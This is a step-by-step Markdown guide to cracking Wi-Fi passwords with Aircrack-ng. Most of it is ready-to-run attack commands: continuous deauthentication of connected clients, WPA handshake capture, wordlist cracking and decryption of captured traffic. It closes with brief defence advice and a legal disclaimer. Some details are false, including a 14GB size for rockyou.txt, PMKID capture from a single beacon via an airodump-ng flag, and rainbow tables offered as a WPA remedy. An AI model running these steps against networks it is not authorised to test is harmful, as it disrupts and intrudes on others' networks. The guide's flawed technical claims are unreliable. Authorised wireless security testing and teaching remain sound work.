# Aircrack-ng: The Complete Wi-Fi Cracking Guide

## Introduction to Aircrack-ng

Aircrack-ng is a powerful suite of tools used for **Wi-Fi network security assessment**. It includes utilities for:

- **Capturing** Wi-Fi packets (including WPA/WPA2 handshakes)
- **Cracking** WEP, WPA-PSK, and WPA2-PSK keys
- **Performing** deauthentication attacks
- **Analyzing** network traffic
- **Injecting** packets to force handshakes

### What's in the Suite?

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Enable/disable monitor mode on wireless adapter |
| `airodump-ng` | Capture Wi-Fi packets and identify networks |
| `aireplay-ng` | Replay captured packets and deauthenticate clients |
| `aircrack-ng` | Crack WEP and WPA/WPA2 passwords |
| `airdecap-ng` | Decrypt captured packets if password known |
| `airbase-ng` | Create fake AP (for advanced attacks) |
| `airgraph-ng` | Generate graphs from captured data |

## Prerequisites

### Hardware Requirements
- **Linux system** (Kali Linux recommended)
- **Wi-Fi adapter** that supports monitor mode
  - Recommended: TP-LINK TL-WN722N
  - Other options: Alfa Networks, Atheros chipset, Ralink
  - RTL8188CUS, Realtek chipsets also supported
- **Target Wi-Fi network** (WEP/WPA/WPA2)
- **Wordlist** for password cracking
  - `/usr/share/wordlists/rockyou.txt` (Kali default)
  - Or custom wordlists

### Software Requirements
- Kali Linux or similar Linux distribution
- Aircrack-ng suite installed
- Root access (required for monitor mode)

### Knowledge Requirements
- Basic Linux command line
- Understanding of Wi-Fi concepts
- Network terminology (BSSID, SSID, channel)

## Step-by-Step Wi-Fi Cracking Process

### Step 1: Check and Enable Monitor Mode

Monitor mode allows capturing packets without associating with an AP.

**Check current wireless interfaces:**
```bash
# List all wireless interfaces
iwconfig

# Output should show wlan0, wlan1, etc.
```

**Enable monitor mode:**
```bash
# Start monitor mode on wlan0
sudo airmon-ng start wlan0

# Output will show new interface (usually wlan0mon)
# Example output:
# Interface       Chipset         Driver
# wlan0           Atheros AR9271  ath9k_htc - [phy0]
# (monitor mode enabled on wlan0mon)
```

**Kill interfering processes:**
```bash
# Some services may block monitor mode
sudo airmon-ng check kill

# Stops: NetworkManager, dhcpd, etc.
```

**Verify monitor mode is enabled:**
```bash
# Should see "Monitor" mode
iwconfig wlan0mon

# Output:
# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.4 GHz
```

---

### Step 2: Scan for Target Networks

List all nearby Wi-Fi networks to find your target.

**Basic scan:**
```bash
# Scan for all networks
sudo airodump-ng wlan0mon

# Press Ctrl+C to stop
```

**Output Columns:**
```
BSSID             PWR  Beacons  #Data #/s  CH  MB   ENC CIPHER AUTH
00:1A:2B:3C:4D:5E -42   100     50    0   11  150  WPA2 CCMP   PSK

BSSID: MAC address of the Access Point
PWR: Signal strength (-30 = strong, -80 = weak)
Beacons: Management frames sent
#Data: Data packets captured
#/s: Packets per second
CH: Channel number (1-13 for 2.4 GHz)
MB: Speed capability
ENC: Encryption type (WEP, WPA, WPA2, WPA3, Open)
CIPHER: Encryption algorithm (CCMP=AES, TKIP, WEP)
AUTH: Authentication (PSK, MGT, OPN)
```

**Filtered scan (save BSSID information):**
```bash
# Continue scanning and write to file
sudo airodump-ng -w networks wlan0mon

# Creates files:
# networks-01.csv
# networks-01.kismet.csv
# networks-01.netxml
```

---

### Step 3: Capture Handshake (WPA/WPA2)

Capture the complete 4-way handshake to crack the password later.

**Method 1: Passive Capture**
```bash
# Capture traffic from specific AP
sudo airodump-ng -w capture -c 11 --bssid 1E:CF:18:34:0C:D5 wlan0mon

# -w capture: Write to file named "capture"
# -c 11: Monitor channel 11 (replace with target channel)
# --bssid: Specific AP to target
# Leave running and wait for client to connect
```

**Method 2: Force Handshake with Deauthentication Attack**

Deauthentication forces clients to reconnect, capturing handshake.

**Terminal 1: Start Capturing**
```bash
# Start capture in first terminal
sudo airodump-ng -w capture -c 11 --bssid 1E:CF:18:34:0C:D5 wlan0mon

# Keep this running
```

**Terminal 2: Perform Deauth Attack**
```bash
# In second terminal, send deauth packets
sudo aireplay-ng --deauth 10 -a 1E:CF:18:34:0C:D5 wlan0mon

# --deauth 10: Send 10 deauth packets
# -a [BSSID]: Target AP MAC address
# Repeat this command if needed
```

**What You'll See:**
- Clients disconnect from AP
- Clients reconnect automatically
- **Handshake captured!** ✓ (Watch for "[+] WPA handshake: XX:XX:XX:XX:XX:XX")

---

### Step 4: Verify Handshake with Wireshark

Verify the captured handshake contains all 4 messages.

**Open capture file in Wireshark:**
```bash
# View capture file
wireshark capture-01.cap &

# Or command line
tshark -r capture-01.cap -Y eapol
```

**Filter for EAPOL frames:**
- In Wireshark: Filter field type `eapol`
- Look for 4 EAPOL Key frames:
  1. Message 1: ANonce
  2. Message 2: SNonce + MIC
  3. Message 3: GTK + MIC
  4. Message 4: ACK

**Handshake Complete Indicators:**
```
Message 1 -> Frame 1
Message 2 -> Frame 2 (key_info: 0x0101 or 0x0109)
Message 3 -> Frame 3 (key_info: 0x13c9 or 0x13cd)
Message 4 -> Frame 4 (key_info: 0x0300)
```

---

### Step 5: Stop Monitor Mode

After capturing, disable monitor mode.

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restore normal mode
iwconfig wlan0

# Restart networking (optional)
sudo service networking restart
```

---

### Step 6: Password Cracking with Aircrack-ng

Crack the captured WPA2 password using a wordlist.

**Crack with rockyou.txt:**
```bash
# Crack the password
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# -w: Path to wordlist
# Output will show:
# [00:00:XX] Tried 50000 keys in X seconds (XX keys/sec)
# KEY FOUND! [password123]
```

**Crack with custom wordlist:**
```bash
# Use your own wordlist
sudo aircrack-ng capture-01.cap -w /path/to/wordlist.txt

# Show progress
sudo aircrack-ng capture-01.cap -w /path/to/wordlist.txt -b 1E:CF:18:34:0C:D5
```

**Crack with GPU acceleration (faster):**
```bash
# Using pyrit with GPU support
pyrit -r capture-01.cap -b 1E:CF:18:34:0C:D5 attack_db

# Much faster than CPU-only
```

**Output on Success:**
```
[00:05:34] Tried 250000 keys in 324 seconds (771 keys/sec)

                        [+] Master Key Found: 123456789

     0A 1B 2C 3D 4E 5F 6A 7B 8C 9D 0E 1F 2A 3B 4C 5D

       Transient Key : 5A 6B 7C 8D 9E 0F 1A 2B 3C 4D 5E 6F

```

---

## Practical Example

### Scenario
- Target SSID: "Guest Network"
- Target BSSID: 1E:CF:18:34:0C:D5
- Channel: 11
- Adapter: wlan0
- Wordlist: /usr/share/wordlists/rockyou.txt

### Complete Commands

**Terminal 1: Enable Monitor and Scan**
```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon
# (Find target, note BSSID, channel, encryption)
```

**Terminal 1: Start Capture**
```bash
# Keep running in background
sudo airodump-ng -w hack1 -c 11 --bssid 1E:CF:18:34:0C:D5 wlan0mon
```

**Terminal 2: Deauth Attack**
```bash
# Force handshake capture
sudo aireplay-ng --deauth 0 -a 1E:CF:18:34:0C:D5 wlan0mon

# --deauth 0 = continuous deauth
# Can modify number if needed
```

**Wait for Handshake**
```
# Watch Terminal 1 for:
# [+] WPA handshake: 1E:CF:18:34:0C:D5
```

**Stop Monitor Mode**
```bash
# After handshake captured
sudo airmon-ng stop wlan0mon
```

**Verify in Wireshark**
```bash
wireshark hack1-01.cap &

# Filter: eapol
# Verify 4 frames present
```

**Crack Password**
```bash
# Crack the WPA2 password
sudo aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt

# Output:
# KEY FOUND! [123456789]
```

---

## Advanced Techniques

### PMKID Attack (Faster Handshake Capture)

Capture PMKID from a single beacon frame.

```bash
# Capture PMKID
sudo airodump-ng -w pmkid_capture --pmkid wlan0mon

# Faster than waiting for full handshake
# Only need single beacon frame

# Crack with hashcat or Aircrack-ng
sudo aircrack-ng pmkid_capture-01.cap -w wordlist.txt
```

### Creating Wordlists

**Use existing wordlists:**
```bash
# Common locations in Kali
ls /usr/share/wordlists/

# rockyou.txt (14GB uncompressed)
# Decompress rockyou:
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Generate custom wordlist:**
```bash
# Using crunch
crunch 8 12 -o wordlist.txt
# Generates all combinations 8-12 chars

# Using john
john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout > rules_wordlist.txt

# Using cewl (website-based)
cewl https://target-website.com -w wordlist.txt
```

### Targeting WEP Networks

**WEP is easier to crack (deprecated):**

```bash
# 1. Capture WEP packets
sudo airodump-ng -w wep_capture -c 6 --bssid [BSSID] wlan0mon

# 2. Wait for enough packets (10000+)
# 3. No handshake needed!

# 4. Crack WEP
sudo aircrack-ng wep_capture-01.cap

# Usually cracks in seconds to minutes
```

### Decrypting Captured Traffic

**If you crack the password:**

```bash
# Decrypt captured packets
airdecap-ng -w 123456789 capture-01.cap -o decrypted.cap

# -w: The cracked password
# -o: Output file with decrypted packets

# Open decrypted.cap in Wireshark
wireshark decrypted.cap
```

---

## Defense and Protection

### Strengthen Your Own Network

**1. Use WPA3**
```bash
# Router settings: Use WPA3-Personal
# If unavailable: WPA2 minimum
```

**2. Strong Password**
```bash
# Requirements:
# - 16+ characters
# - Mix of uppercase, lowercase, numbers, symbols
# - No dictionary words
# - No personal information

# Example: 7@k#mQ9$vL2!xR5p
```

**3. Hide SSID**
```bash
# Does NOT prevent attacks, but adds obscurity
# Router settings: Disable SSID broadcast
```

**4. Change Default Credentials**
```bash
# Default router admin passwords vulnerable
# Access: 192.168.1.1
# Change default username/password
```

**5. Update Firmware**
```bash
# Keep router firmware updated
# Patches security vulnerabilities
# KRACK and other attacks patched
```

**6. Disable WPS**
```bash
# Wi-Fi Protected Setup has vulnerabilities
# Router settings: Disable WPS
```

**7. MAC Filtering** (Limited effectiveness)
```bash
# Only allow specific device MAC addresses
# Adds layer of security
# Can be spoofed but adds friction
```

---

## Troubleshooting

### Common Issues

**Monitor Mode Won't Enable**
```bash
# Issue: Driver not supporting monitor mode

# Solution 1: Kill interfering processes
sudo airmon-ng check kill

# Solution 2: Use a compatible adapter
# Check chipset: lsusb or lspci

# Solution 3: Update drivers
sudo apt update && sudo apt upgrade
```

**No Handshake Captured**
```bash
# Issue: Waiting but no clients connecting

# Solution 1: Extend wait time
# Solution 2: Use more aggressive deauth
sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon

# Solution 3: Verify capture settings
# Make sure -c flag has correct channel
```

**Aircrack-ng Not Finding Password**
```bash
# Issue: Password not in wordlist

# Solutions:
# 1. Use larger wordlist
# 2. Create custom wordlist
# 3. Use rainbow tables (faster)
# 4. Use GPU acceleration
```

---

## Legal and Ethical Considerations

### ⚠️ IMPORTANT DISCLAIMER

**This guide is for EDUCATIONAL purposes only**

- **Only crack networks you own or have explicit written permission to test**
- **Unauthorized access to networks is ILLEGAL**
- **Performing attacks without permission violates:**
  - Computer Fraud and Abuse Act (CFAA) - USA
  - Computer Misuse Act - UK
  - Similar laws in other countries

### Legitimate Uses
- ✅ Testing your own networks
- ✅ Authorized penetration testing (with written contract)
- ✅ Security research
- ✅ Educational learning in controlled labs
- ✅ Home network security testing

### What NOT to Do
- ❌ Crack neighbor's Wi-Fi
- ❌ Test without written permission
- ❌ Access systems you don't own
- ❌ Use skills for malicious purposes

---

**Related Resources:**
- [The 4-Way Handshake](../05-4-Way-Handshake/README.md) - Technical details
- [Wi-Fi Security Protocols](../03-WiFi-Security-Protocols/README.md) - Protocol overview
- Aircrack-ng Official: https://www.aircrack-ng.org/
